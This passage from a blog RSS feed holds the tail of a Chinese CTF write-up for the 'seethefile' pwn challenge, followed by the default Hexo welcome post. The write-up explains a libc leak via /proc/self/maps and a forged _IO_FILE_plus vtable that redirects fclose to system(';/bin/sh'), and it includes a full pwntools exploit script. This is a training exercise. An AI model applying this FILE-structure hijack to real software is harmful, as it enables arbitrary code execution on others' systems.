&lt;p&gt;泄露地址的操作，在进行数据泄露的时候除了程序的内存表，还可以利用环境的相关内容。通过打开 /proc/self/mmap 这个虚拟文件来获取当前进程的地址空间情况，&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;整体思路：1. 泄露 libc 地址，获取 system 函数的真实地址&lt;/p&gt;
&lt;p&gt;​	2. 利用 fp 后面的 bss 伪造 file_plus 的结构体（）这部分内存全是空的&lt;/p&gt;
   &lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;name:&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,				&lt;span class=&#34;comment&#34;&gt;//0x20字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fp:fake_file_start &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//下面时伪造的file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flags_:&lt;span class=&#34;number&#34;&gt;0xffffdfff&lt;/span&gt;			&lt;span class=&#34;comment&#34;&gt;//fake_file_start&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_io_read_ptr:&lt;span class=&#34;string&#34;&gt;&amp;quot;;/bin/sh&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//下面就可以全是0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vtable:fake_file_start+&lt;span class=&#34;number&#34;&gt;0x94&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//fake_vatable   fclose偏移为2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;, __dummy)：&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;, __dummy2)）：&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_finish_t, __finish)：system_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;//剩下的全写0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用_IO_FINSH (fp)，_IO_FINISH (fp) 相当于调用 fp-&amp;gt;vtabl-&amp;gt;__finish (fp)，此时实际上执行的 system (fp);&lt;/p&gt;
&lt;p&gt;因此此时的 fp 指针其实就是 system 的参数，虽然 fp 并未直接指向 &amp;quot;/bin/sh&amp;quot;, 但是 system 解析指令的时，无法解析 0xffffdfff，便会继续向后检查，这里除了写”;bin/sh“, 话可以有”||/bin/sh“, 覆盖后面的指针也问题不大&lt;/p&gt;
&lt;h2 id=&#34;补充后来复现在这个题的时候发现通过上面的伪造方式是无法实现vtable指针的改写是因为数据过长后到了bss下面的区域这块区域会将数据清空而且我们在改的过程中还有一个值得注意的地方就是io_file-里面-的_offset变量一定要是我们fp指针的4偏移&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#补充后来复现在这个题的时候发现通过上面的伪造方式是无法实现vtable指针的改写是因为数据过长后到了bss下面的区域这块区域会将数据清空而且我们在改的过程中还有一个值得注意的地方就是io_file-里面-的_offset变量一定要是我们fp指针的4偏移&#34;&gt;#&lt;/a&gt; 补充，后来复现在这个题的时候，发现通过上面的伪造方式，是无法实现 vtable 指针的改写，是因为数据过长后，到了 bss 下面的区域，这块区域会将数据清空，而且我们在改的过程中，还有一个值得注意的地方，就是 io_file 里面 的_offset 变量，一定要是我们 fp 指针的 + 4 偏移&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./seethefile&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf =ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./seethefile&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;/lib/i386-linux-gnu/libc-2.23.so&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name = &lt;span class=&#34;number&#34;&gt;0x804B260&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fp = &lt;span class=&#34;number&#34;&gt;0x804B280&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ch&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt; ,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;open_file&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;file_path&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;What do you want to see :&amp;quot;&lt;/span&gt;,file_path)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;open_file(&lt;span class=&#34;string&#34;&gt;&amp;quot;/proc/self/maps&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;[heap]\n&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;b&amp;quot;0x&amp;quot;&lt;/span&gt;+r.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc_base))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;] + libc_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;system : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x01\xA0;/bin/sh\x00\x00&amp;#x27;&lt;/span&gt;+p32(system_addr)+p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;+p32(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload +=p32(&lt;span class=&#34;number&#34;&gt;0xcafebabe&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt; + p32(&lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;) + p32(&lt;span class=&#34;number&#34;&gt;0xcafebabe&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; +p32(name+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload =payload.ljust(&lt;span class=&#34;number&#34;&gt;0x94&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)+p32(&lt;span class=&#34;number&#34;&gt;0x0804b264&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r,&lt;span class=&#34;string&#34;&gt;&amp;#x27;b *0x08048AF5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Leave your name :&amp;quot;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;总结：这个文章内容比较多，但是重点就在与 io_file_plus 以及虚表的使用，有时候较低的版本可以不去伪造 vtable, 而时可以直接修改 vtable 的数据，但是当下的新版本不在可以。对于不同的函数有不同的利用姿势。、&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/03/19/hello-world/</guid>
            <title>Hello World</title>
            <link>http://example.com/2021/03/19/hello-world/</link>
            <category>Hello World</category>
            <pubDate>Fri, 19 Mar 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
